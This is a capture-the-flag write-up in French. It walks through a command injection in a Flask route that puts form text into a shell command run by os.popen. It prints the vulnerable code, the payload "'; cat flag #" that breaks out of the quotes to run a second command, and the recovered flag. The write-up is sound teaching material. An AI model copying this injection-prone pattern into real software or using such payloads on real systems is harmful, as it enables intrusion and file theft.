# Write-up

Tout d'abord, il faut obtenir le code source à l'aide du lien qui se trouve au bas de la page.

Dans le code source, on voit que la fonction suivante est celle qui est appelée lorsqu'on soumet le formulaire:

```python
@app.route("/", methods=["POST"])
def post_index():
    text = request.form.get("text")
    cmd = f"echo '{text}' | grep -oiP 'FLAG-[abcdef0-9]+'"

    print(cmd)
    stream = os.popen(cmd)
    
    return render_template("index.html", output = stream.read())
```

La commande qui sera exécutée se trouve à la ligne 4:

```python
cmd = f"echo '{text}' | grep -oiP 'FLAG-[abcdef0-9]+'"
```

On sait que le flag se trouve dans un fichier appelé `flag`. La commande qui permet de lire un fichier sur Ubuntu est `cat`. On souhaite donc effectuer la commande `cat flag`.

Toutefois, pour détourner cette commande, on doit d'abord s'assurer que les bouts de commandes existants ne nous gêneront pas. On doit donc sortir des guillemets simples (`'`) et terminer la commande qui précède notre texte avec `;`. Ensuite, on pourra exécuter la commande qu'on veut.

Voici donc notre attaque finale:

```
'; cat flag #
```

Ce qui donnera la commande suivante:

```
echo ''; cat flag #' | grep -oiP 'FLAG-[abcdef0-9]+'
```

> Le dernier morceau de commande (`#' | grep -oiP 'FLAG-[abcdef0-9]+'`) est interprété par Bash comme un commentaire (donc ignoré), puisqu'il commence par `#`.

Avec cette attaque, le programme sort le résultat suivant:

```
FLAG-eca40c791011bb2f7830ce6343df95c5
```
